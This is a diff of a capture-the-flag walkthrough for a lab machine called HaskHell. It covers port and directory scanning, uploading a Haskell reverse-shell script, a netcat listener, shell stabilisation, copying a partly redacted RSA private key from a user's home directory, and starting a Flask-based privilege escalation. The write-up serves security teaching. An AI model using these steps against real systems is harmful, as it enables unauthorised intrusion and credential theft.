@@ -1,8 +1,10 @@
 # Name = HaskHell
+
+IP:
+```bash
+export IP=10.10.68.222
 ```
-IP: export IP=10.10.68.222
-```
-First ao all, we need to do a port scan using `nmap`
+First of all, we need to do a port scan using `nmap`
 ```bash
 sudo nmap -sC -sV -A -T4 -p- -v -oN scans/nmap.initial $IP
 ```
@@ -23,7 +25,7 @@ Ports open:
 Port |Service
 -----|----------
 22   |ssh
-5001 |gunicorn - web server
+5001 |http - Gunicorn 19.7.1
 
 Walking around the page we notice that we should upload our scripts written in Haskell, but when we click link to uploads we see a 404 error. Somewhere around should be valid upload page, time to search for it. I primarily use `gobuster`
 ```bash
@@ -37,12 +39,13 @@ dir      |Directory scan
 
 I found seclists to be updated and running great. Scanning with gobuster shows us another page:
 
-Directory found
+Directory found:
 - /submit
 
 Going to /submit page we found upload form, and judging from what we read earlier it woul only accept `*.hs` files, and trying with .txt file does nothing. Quick search around internet, and changig file format to .hs shows us it's true.
 Looking around for suitabe code I found something that can spawn a reverse shell:
-Simply write a script that spawns shell:
+
+Simply write a script that spawns shell in Your favourite text editor (nano, gedit, sublime):
 ```haskell
 import System.Process
 main = do
@@ -56,21 +59,29 @@ and the address we need to type in the script is right after `inet`.
 
 
 This is just a simple reverse shell as found on [Pentest Monkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet), but preceded with bash -c to compile command.
-After uploading the file it runs automatically, but don't forget to spawn netcat listener first!
+
+After uploading the file it runs automatically, but don't forget to spawn `netcat` listener first!
 ```bash
 nc -lvnp LPORT
 ```
-LPORT is the port number we will listen on and must correspond with LPORT in Haskell script uploaded on the server.
+Command   |Effect
+----------|--------
+-l        |Listen mode
+-v        |Verbose output
+-n        |Numeric-only
+-p        |Port to listen on
+LPORT     |Port number included in script
 
 We got the reverse shell! Time to stabilize it:
 ```bash
 python3 -c "import pty;pty.spawn('/bin/bash')"
 ```
-press Ctrl + Z to bacground session, then type
+press Ctrl + Z to background session, then type
 ```bash
 stty raw -echo
 ```
 type in fg (won't show because of echo), press ENTER twice
+
 back on the shell type 
 ```bash
 export TERM=xterm
@@ -91,6 +102,10 @@ EDITED
 MMn8PNqYKF3DWex59PYiy5ZL1pUG2Y+iadGfIbStSZzN4nItF5+yC42Q2wlhtwgt
 i4MU8bepL/GTMgaiR8RmU2qY7wRxfK2Yd+8+GDuzLPEoS7ONNjLhNA==
 -----END RSA PRIVATE KEY-----
+```
+To reveal the hidden files inside /home/prof/ use tag -a to ls command. I usually do this with -l tag to show list:
+```bash
+ls -la
 ```
 
 Simply copy the key to Your machine and save it in id_rsa file. Next change file permissions to read-write for user only (600):
@@ -114,7 +129,7 @@ Running this command however, throws us an error:
 ```
 Error: Could not locate Flask application. You did not provide the FLASK_APP environment variable.
 ```
-Seems we need to give some variable to get it running. After a while of searching I foun out that it can accept python scripts as input. That's great news! Easiest way to exploit it is simple os spawn script in python:
+Seems we need to give some variable to get it running. After a while of searching I found out that it can accept python scripts as input. That's great news! Easiest way to exploit it is simple os spawn script in python:
 ```bash
 nano shell.py
 ```
